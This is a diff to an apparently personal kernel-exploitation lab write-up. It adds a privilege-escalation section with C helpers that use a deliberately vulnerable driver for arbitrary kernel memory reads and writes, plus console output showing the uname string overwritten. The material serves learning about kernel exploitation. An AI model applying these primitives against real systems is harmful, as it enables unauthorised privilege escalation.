@@ -11,6 +11,7 @@
 * [Device driver module and the first exploit](#device-driver-module-and-the-first-exploit)  
          * [Device file](#device-file)  
          * [The first exploit](#the-first-exploit)  
+* [Privilege escalation with driver files](#pivilege-escalation-with-driver-files)
 
 ## Creating the enviornment and the first kernel module
 
@@ -187,3 +188,37 @@ uname -a
 HELLO latsa 5.11.0 #2 SMP Thu Feb 25 14:33:41 CET 2021 x86_64 GNU/Linux
 ```
 It's working!
+
+## Privilege escalation with driver files  
+
+### Cleaning up previous exploit  
+To be able to use our exploit for more than abusing uname, we need to clean the code a little bit. I basically wrote two functions: `read_kernel` and `write_kernel`.  
+```
+void read_kernel(void *address, const char* buffer, ssize_t size){
+        check_fd();
+        write_device(FD, address, size);
+        read_device(FD, buffer, BUFFER_LEN);
+}
+```  
+```
+void write_kernel(void *address, const char* str_to_send, ssize_t size){
+        check_fd();
+        write_device(FD, str_to_send, size);
+        read_device(FD, address, size);
+}
+```  
+In`read_kernel` we make the driver write from the given address to its buffer, and we read it into our buffer. In `write_kernel` we write something into its buffer and then read it to the desired memory address. With this the previous exploit runs even better.  
+```
+# ./privesc 
+[+] Opening device file...
+[+] Reading from target...
+[+] Kernel address successfully read
+Linux
+[+] Writing to target...
+[+] Successfully written to target! Check with uname -a
+# uname -a
+HELLO latsa_kernel 5.11.0 #2 SMP Wed Mar 3 11:40:39 CET 2021 x86_64 GNU/Linux
+```  
+
+
+
